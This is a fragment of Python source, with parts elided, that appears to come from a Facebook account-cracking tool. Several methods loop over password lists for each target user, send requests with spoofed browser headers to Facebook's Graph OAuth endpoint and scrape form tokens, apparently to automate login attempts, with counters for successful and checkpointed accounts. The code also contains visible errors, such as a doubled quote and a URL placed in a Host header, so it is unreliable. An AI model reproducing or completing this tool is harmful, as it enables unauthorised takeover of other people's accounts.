...
#        print('\r %s[ %s %s] %s/%s [OK-:%s]-[CP-:%s]'%(K,B,K,datetime.now(
    ...
    def basic(self, user, _jeeck_X_nano_):
        ...
        for pw in _jeeck_X_nano_:
            ...
            ses.headers.update({'referer': ''https://graph.facebook.com/v13.0/oauth/access_token'})
    ...
    def free(self, user, _jeeck_X_nano_):
        ...
        for pw in _jeeck_X_nano_:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"graph.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,+/+;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://graph.facebook.com/v13.0/oauth/access_token?")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.+?)"', p.text))
            data = {}
            for i in b('input'):
    ...
    def mobil(self, user, _jeeck_X_nano_):
        ...
        for pw in _jeeck_X_nano_:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"https://graph.facebook.com/v13.0/oauth/access_token?","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,+/+;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://graph.facebook.com/v13.0/oauth/access_token?")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.+?)"', p.text))
            data = {}
